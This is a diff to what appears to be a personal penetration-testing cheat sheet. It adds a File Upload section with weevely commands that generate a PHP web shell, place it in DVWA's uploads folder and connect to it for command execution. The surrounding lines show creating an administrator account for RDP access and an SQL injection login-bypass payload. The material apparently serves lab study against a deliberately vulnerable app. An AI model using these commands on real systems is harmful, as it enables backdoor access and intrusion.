@@ -100,6 +100,20 @@ Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wor
 		       | net user Test      (Once again check to see if it has become administrator)
 Now you can do a RDP connection with the given ip and the Test account which you created.
 ```
+#File Upload
+```
+low
+weevely generate <pwd> <backdoor>.php
+subl <backdoor>.php	/ nano <backdoor>.php
+weevely http://<ipaddr>/dvwa/hackable/uploads/<backdoor>.php <pwd> 		(sau đó có thể dùng đc cmd)
+```
+<img width="700" height="300" alt="Screenshot 2026-03-19 at 18 50 57" src="https://github.com/user-attachments/assets/4b16bb5f-392e-490c-a687-655c253bd50c" />
+
+```
+medium
+
+```
+
 #  SQL 
 ```
 1- Auth Bypass-  hi'OR 1=1 --
